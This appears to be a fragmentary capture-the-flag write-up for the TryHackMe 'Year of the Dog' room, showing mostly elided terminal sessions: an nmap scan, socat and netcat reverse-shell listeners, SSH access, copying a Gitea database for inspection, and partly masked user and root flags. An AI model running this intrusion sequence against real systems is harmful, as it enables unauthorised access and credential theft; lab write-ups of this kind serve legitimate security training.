...
```
bibo318@parrot:~/CTFs/tryhackme/Year of the Dog$ sudo nmap -A -sS -sC -sV -O 10.10.179.85
...
```
bibo318@parrot:~/CTFs/tryhackme/Year of the Dog$ sudo socat tcp-l:53 file:`tty`,raw,echo=0
[sudo] password for kali:
...
```
bibo318@parrot:~/CTFs/tryhackme/Year of the Dog$ ssh dylan@10.10.179.85
...
THM{V0N318*****OTE3MTQyNTM5NzRiN2VjNTQyYWM2M2Ji}
```
...
```
bibo318@parrot:~/CTFs/tryhackme/Year of the Dog$ scp dylan@10.10.179.85:/gitea/gitea/gitea.db /home/kali/CTFs/tryhackme/Year\ of\ the\ Dog/gitea.db
dylan@10.10.179.85's password:
gitea.db                                                                         100% 1184KB 393.6KB/s   00:03
bibo318@parrot:~/CTFs/tryhackme/Year of the Dog$ sqlite3 gitea.db
...
sqlite> .quit
bibo318@parrot:~/CTFs/tryhackme/Year of the Dog$
```
...
```
bibo318@parrot:~/CTFs/tryhackme/Year of the Dog$ nc -nlvp 9001
...
THM{V0N318*****MzlhNGY5YWM0ZTU5ZGQ0OGI0YTc0OWRh}
```

User Flag

`THM{V0N318*****OTE3MTQyNTM5NzRiN2VjNTQyYWM2M2Ji12**123:))}`

Root Flag

`THM{V0N318*****MzlhNGY5YWM0ZTU5ZGQ0OGI0YTc0OWRh12**123:))}`
